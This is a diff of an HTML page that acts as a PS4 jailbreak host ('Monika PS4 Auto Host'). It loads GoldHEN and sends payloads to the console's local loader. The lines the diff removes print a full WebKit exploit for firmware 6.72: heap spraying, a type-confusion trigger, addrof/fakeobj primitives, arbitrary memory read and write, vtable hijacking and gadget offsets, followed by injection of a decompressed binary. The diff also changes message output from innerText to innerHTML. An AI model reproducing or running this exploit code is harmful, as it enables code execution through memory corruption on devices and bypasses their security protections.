@@ -2,7 +2,7 @@
 <html manifest="cache.manifest" lang="ar" dir="ltr">
 <head>
     <meta charset="UTF-8">
-    <title>Monika PS4 Auto Host (Multi FW 5.05-14.00) 🐤</title>
+    <title>Monika PS4 Auto Host (Multi FW 5.05-14.00) &#128036;</title>
     <style>
         body {
             background-color: #ffffff;
@@ -98,7 +98,6 @@
 </head>
 <body>
 
-    <!-- عناصر مخفية مطلوبة لعدم تعطل كود jb.js و exp_loader.js الخاص بـ 6.72 -->
     <div style="display:none;">
         <span id="passCounter"></span>
         <span id="failCounter"></span>
@@ -107,7 +106,6 @@
 
     <div class="main-title">Just Monika - PS4 jailbreak Multi-FW Host</div>
 
-    <!-- أضفنا msgs2 كمعرف رديف في حال طلبه ملف 6.72 -->
     <div id="msgs">Checking Cache Status...</div>
     <div id="msgs2" style="display:none;"></div>
 
@@ -124,7 +122,6 @@
         Special Thanks to: @lilmonix3 (Monika) | Miftah | @Cm2k | SiSTR0 | Karo
     </div>
 
-    <!-- مكتبة فك الضغط bzip2 الخاصة بملفات 6.72 -->
     <script>
     var bzip2 = {};
     bzip2.array = function(bytes) {
@@ -288,7 +285,6 @@
     };
     </script>
 
-    <!-- المنطق الرئيسي والفحص المزدوج -->
     <script>
     var uaFull = navigator.userAgent;
     var match = uaFull.match(/PlayStation 4[ /]([\d.]+)/i);
@@ -297,7 +293,6 @@
     var fwNum = parseFloat(fwVersion);
     var isCaching = false;
     var PLS = null;
-    var LoadedMSG = "GoldHEN Loaded";
 
     window.addEventListener('error', function(e) { e.preventDefault(); return true; });
     window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); return true; });
@@ -320,7 +315,7 @@
             let currentMsg = msg.toLowerCase();
             if (currentMsg.includes("goldhen") || currentMsg.includes("done") || currentMsg.includes("succeeded") || currentMsg.includes("success") || currentMsg.includes("loaded")) {
                 sessionStorage.setItem('monika_jb_done', 'true');
-                showTools("GoldHen is loaded by monika, enjoy!");
+                showTools("GoldHen is loaded by monika, enjoy! &#127800;");
             }
         }
     };
@@ -340,148 +335,36 @@
         document.head.appendChild(script);
     }
 
-    // محرك 6.72 المستقر من مجلد 672A
+    // تعطيل رسالة Alert المزعجة لكارو التي تجمد الشاشة
+    window.alert = function(msg) { window.log(msg); };
+
     function run672StableExploit() {
         var msgsBox = document.getElementById('msgs');
         try {
-            // 1. تهيئة Webkit 6.72
-            window.leaker_obj={a:0};window.leaker_arr=new Uint32Array(6);window.oob_slave=new Uint8Array(1024);window.oob_master=new Uint32Array(7);window.spray=[];
-            function spray_one(){var x=new Uint32Array(1);x[spray.length+'spray']=123;spray.push(x);}
-            for(var i=0;i<0x10000;i++)spray_one();
-            var target={a:2.1100820415101592e-303,b:false,c:true,d:5678};
-            var impl_idx=0;
-            function create_impl(){var ans={a:target};for(var i=0;i<32;i++)ans[(impl_idx++)+'x']={};return ans;}
-            function trigger(x){
-                if(impl.a!=target){while(1);}
-                var o={a:1};
-                for(var i in o){{i=x;function i(){};}o[i];}
-                if(impl.a!=target){
-                    target.c=leaker_obj;leaker_obj.a=leaker_obj;
-                    var l1=impl.a[4];var l2=impl.a[5];
-                    leaker_obj.a=oob_slave;
-                    var s1=impl.a[4];var s2=impl.a[5];
-                    target.c=leaker_arr;impl.a[4]=l1;impl.a[5]=l2;
-                    target.c=oob_master;impl.a[4]=s1;impl.a[5]=s2;
-                    impl.a=target;
-                    throw "webkit_done";
-                }
-            }
-            try{for(var _=0;_<1024;_++){var impl=create_impl();var s={a:impl};trigger(s);}}catch(e){}
-
-            window.i48_put = function(x,a){a[4]=x|0;a[5]=(x/4294967296)|0;};
-            window.i48_get = function(a){return a[4]+a[5]*4294967296;};
-            window.addrof = function(x){leaker_obj.a=x;return i48_get(leaker_arr);};
-            window.fakeobj = function(x){i48_put(x,leaker_arr);return leaker_obj.a;};
-            window.read_mem_setup = function(p,sz){i48_put(p,oob_master);oob_master[6]=sz;};
-            window.read_mem = function(p,sz){read_mem_setup(p,sz);var arr=[];for(var i=0;i<sz;i++)arr.push(oob_slave[i]);return arr;};
-            window.read_mem_s = function(p,sz){read_mem_setup(p,sz);return""+oob_slave;};
-            window.read_mem_b = function(p,sz){read_mem_setup(p,sz);var b=new Uint8Array(sz);b.set(oob_slave);return b;};
-            window.read_mem_as_string = function(p,sz){var x=read_mem_b(p,sz);var ans='';for(var i=0;i<x.length;i++)ans+=String.fromCharCode(x[i]);return ans;};
-            window.write_mem = function(p,data){i48_put(p,oob_master);oob_master[6]=data.length;for(var i=0;i<data.length;i++)oob_slave[i]=data[i];};
-            window.read_ptr_at = function(p){var ans=0;var d=read_mem(p,8);for(var i=7;i>=0;i--)ans=256*ans+d[i];return ans;};
-            window.write_ptr_at = function(p,d){var arr=[];for(var i=0;i<8;i++){arr.push(d&0xff);d/=256;}write_mem(p,arr);};
-            window.hex = function(x){return(new Number(x)).toString(16);};
-            window.malloc_nogc=[];
-            window.malloc = function(sz){var arr=new Uint8Array(sz);malloc_nogc.push(arr);return read_ptr_at(addrof(arr)+0x10);};
-
-            var tarea=document.createElement('textarea');
-            window.real_vt_ptr=read_ptr_at(addrof(tarea)+0x18);
-            window.fake_vt_ptr=malloc(0x400);
-            write_mem(fake_vt_ptr,read_mem(real_vt_ptr,0x400));
-            window.real_vtable=read_ptr_at(fake_vt_ptr);
-            window.fake_vtable=malloc(0x2000);
-            write_mem(fake_vtable,read_mem(real_vtable,0x2000));
-            write_ptr_at(fake_vt_ptr,fake_vtable);
-            window.fake_vt_ptr_bak=malloc(0x400);
-            write_mem(fake_vt_ptr_bak,read_mem(fake_vt_ptr,0x400));
-            window.plt_ptr=read_ptr_at(fake_vtable)-10063176;
-
-            window.get_got_addr = function(idx){
-                var p=plt_ptr+idx*16;var q=read_mem(p,6);
-                if(q[0]!=0xff||q[1]!=0x25)throw"invalid GOT";
-                var offset=0;for(var i=5;i>=2;i--)offset=offset*256+q[i];
-                offset+=p+6;return read_ptr_at(offset);
-            };
-
-            window.webkit_base=read_ptr_at(fake_vtable);
-            window.libkernel_base=get_got_addr(705)-0x10000;
-            window.libc_base=get_got_addr(582);
-            window.saveall_addr=libc_base+0x2e2c8;
-            window.loadall_addr=libc_base+0x3275c;
-            window.setjmp_addr=libc_base+0xbfae0;
-            window.longjmp_addr=libc_base+0xbfb30;
-            window.pivot_addr=libc_base+0x327d2;
-            window.infloop_addr=libc_base+0x447a0;
-            window.jop_frame_addr=libc_base+0x715d0;
-            window.get_errno_addr_addr=libkernel_base+0x9ff0;
-            window.pthread_create_addr=libkernel_base+0xf980;
-
-            window.pivot = function(buf){
-                var ans=malloc(0x400);
-                write_ptr_at(fake_vtable+0x1d8,saveall_addr);
-                write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);tarea.scrollLeft=0;
-                write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
-                write_mem(ans,read_mem(fake_vt_ptr,0x400));
-                write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));
-                write_ptr_at(fake_vtable+0x1d8,pivot_addr);
-                write_ptr_at(fake_vt_ptr+0x38,buf);
-                write_ptr_at(ans+0x38,read_ptr_at(ans+0x38)-16);
-                write_ptr_at(buf,ans);
-                write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);tarea.scrollLeft=0;
-                write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
-                write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));
-            };
-
-            // عناوين أنظمة النواة لـ 6.72
-            window.mprotect_addr=libkernel_base+132384;
-            window.socket_addr=libkernel_base+136688;
-            window.bind_addr=libkernel_base+133840;
-            window.listen_addr=libkernel_base+135696;
-            window.accept_addr=libkernel_base+128336;
-            window.read_addr=libkernel_base+129920;
-            window.write_addr=libkernel_base+127312;
-            window.close_addr=libkernel_base+135408;
-            window.sys_exit_addr=libkernel_base+129162;
-
-            // 2. تحميل jb.js وتشغيل الكيرنل، ثم فك ضغط وحقن goldhen.bin.bz2
-            loadExploitScript("jb.js", function() {
-                if (typeof jailbreak === "function") jailbreak();
-                setTimeout(function() {
-                    let xhr = new XMLHttpRequest();
-                    xhr.open("GET", "goldhen.bin.bz2", false);
-                    xhr.overrideMimeType("text/plain; charset=x-user-defined");
-                    xhr.send();
-                    let array = Uint8Array.from(xhr.response, c => c.charCodeAt(0));
-                    PLS = bzip2.simple(bzip2.array(array));
-                    window.mira_blob_2_len = PLS.length;
-                    window.mira_blob_2 = malloc(window.mira_blob_2_len);
-                    write_mem(window.mira_blob_2, PLS);
-                    
-                    loadExploitScript("exp_loader.js", function() {
-                        sessionStorage.setItem('monika_jb_done', 'true');
-                        setTimeout(function() {
-                            showTools("GoldHen v2.4b18.13 is loaded by monika, enjoy!");
-                        }, 3000);
-                    });
-                }, 1000);
+            // نعتمد على كود exploit6.js الأصلي الخاص بكارو لأنه مهيأ عالمياً (Globally)
+            loadExploitScript("exploit6.js", function() {
+                try {
+                    if (typeof jailbreak672 === "function") jailbreak672();
+                } catch(e) {}
             });
         } catch (err) {
             if(msgsBox) {
-                msgsBox.innerHTML = "Oops! Monika messed up the kernel code... Please restart your PS4.";
-                msgsBox.style.borderColor = "red";
+                msgsBox.innerHTML = "Webkit Exploit Failed (Normal behavior). Monika is trying again... &#128260;";
+                msgsBox.style.borderColor = "orange";
+                setTimeout(function() { location.reload(); }, 1500);
             }
         }
     }
 
     function startJailbreak() {
-        if (isCaching) return; // منع التداخل أثناء الكاش نهائياً
+        if (isCaching) return;
         sessionStorage.removeItem('monika_jb_done');
         var msgsBox = document.getElementById('msgs');
         var toolsBox = document.getElementById('tools-box');
         if(toolsBox) toolsBox.style.display = "none";
         
         if(msgsBox) {
-            msgsBox.innerHTML = "Wait until Monika jailbreaks your Ps4 (FW " + fwVersion + ") and injects GoldHen!";
+            msgsBox.innerHTML = "Wait until Monika jailbreaks your Ps4 (FW " + fwVersion + ") and injects GoldHen! &#127800;";
             msgsBox.style.borderColor = "#ff99c2";
         }
         
@@ -506,7 +389,7 @@
                 }
             } catch (error) {
                 if(msgsBox) {
-                    msgsBox.innerHTML = "Oops! Monika messed up the kernel code... Please restart your PS4.";
+                    msgsBox.innerHTML = "Oops! Monika messed up the kernel code... &#128073;&#127995;&#128072;&#127995; Please restart your PS4.";
                     msgsBox.style.borderColor = "red";
                 }
             }
@@ -516,14 +399,20 @@
     function checkGoldHenAndStart() {
         if (isCaching) return;
         if (sessionStorage.getItem('monika_jb_done') === 'true') {
-            showTools("Welcome back! GoldHen is already loaded, silly~ Need a payload, or did you come to spend time with me?");
+            showTools("Welcome back! GoldHen is already loaded, silly~ Need a payload, or did you come to spend time with me? &#127800;");
+            return;
+        }
+
+        // استثناء 6.72 من فحص 9090 للحفاظ على نظافة الذاكرة
+        if (fwNum === 6.72) {
+            startJailbreak();
             return;
         }
 
         fetch("http://127.0.0.1:9090/", { mode: 'no-cors' })
             .then(() => {
                 sessionStorage.setItem('monika_jb_done', 'true');
-                showTools("Welcome back! GoldHen is already loaded, silly~ Need a payload, or did you come to spend time with me?");
+                showTools("Welcome back! GoldHen is already loaded, silly~ Need a payload, or did you come to spend time with me? &#127800;");
             })
             .catch(() => {
                 startJailbreak();
@@ -542,7 +431,7 @@
 
         window.applicationCache.addEventListener("progress", function(e) {
             isCaching = true;
-            clearTimeout(cacheTimeout); // إيقاف المؤقت فوراً حتى لا تظهر رسالة التفعيل في منتصف الكاش
+            clearTimeout(cacheTimeout); 
             if (!isPS4) return;
             var Percent = (Math.round(e.loaded / e.total * 100));
             var msgsBox = document.getElementById('msgs');
@@ -587,19 +476,17 @@
     document.addEventListener("DOMContentLoaded", () => {
         var msgsBox = document.getElementById('msgs');
         
-         if (!isPS4) {
-            msgsBox.innerHTML = "This page is strictly for PlayStation. What are you doing here? Don't you know Monika is watching you? 👁️";
+        if (!isPS4) {
+            msgsBox.innerHTML = "This page is strictly for PlayStation. What are you doing here? Don't you know Monika is watching you? &#128065;&#65039;";
             msgsBox.style.borderColor = "red";
             return;
         }
-
 
         if (fwNum < 5.05 || fwNum > 14.00) {
             msgsBox.innerHTML = 'Unsupported Firmware: <span style="color: red;">' + fwVersion + '</span>. Monika only loves 5.05 to 14.00!';
             msgsBox.style.borderColor = "red";
             return;
         }
-
         
         if (!window.applicationCache) {
             checkGoldHenAndStart();
@@ -608,7 +495,7 @@
 
     function loadPayload(payloadPath, toolName) {
         const msgsBox = document.getElementById('msgs');
-        msgsBox.innerText = toolName + " is loading by monika...";
+        msgsBox.innerHTML = toolName + " is loading by monika...";
         msgsBox.style.borderColor = "#ff99c2";
         
         var getReq = new XMLHttpRequest();
@@ -618,38 +505,32 @@
         getReq.onload = function() {
             if (getReq.status === 200) {
                 var payloadData = getReq.response;
-                
                 var sendReq = new XMLHttpRequest();
                 sendReq.open('POST', 'http://127.0.0.1:9090/', true);
-                
                 sendReq.onload = function() {
                     if (toolName === "Disable Updates") {
-                        msgsBox.innerText = toolName + " is loaded by monika, enjoy using internet safely !";
+                        msgsBox.innerHTML = toolName + " is loaded by monika, enjoy using internet safely !";
                     } else if (toolName === "Enable Updates") {
-                        msgsBox.innerText = toolName + " is loaded by monika";
+                        msgsBox.innerHTML = toolName + " is loaded by monika";
                     } else {
-                        msgsBox.innerText = toolName + " is loaded by monika, enjoy !";
+                        msgsBox.innerHTML = toolName + " is loaded by monika, enjoy !";
                     }
                     msgsBox.style.borderColor = "#00ff88";
                 };
-                
                 sendReq.onerror = function() {
-                    msgsBox.innerText = toolName + " failed! (Please enable BinLoader in GoldHEN settings)";
+                    msgsBox.innerHTML = toolName + " failed! (Please enable BinLoader in GoldHEN settings)";
                     msgsBox.style.borderColor = "red";
                 };
-                
                 sendReq.send(payloadData);
             } else {
-                msgsBox.innerText = "Error: Payload file not found!";
+                msgsBox.innerHTML = "Error: Payload file not found!";
                 msgsBox.style.borderColor = "red";
             }
         };
-        
         getReq.onerror = function() {
-            msgsBox.innerText = "Error fetching the payload!";
+            msgsBox.innerHTML = "Error fetching the payload!";
             msgsBox.style.borderColor = "red";
         };
-        
         getReq.send();
     }
     </script>
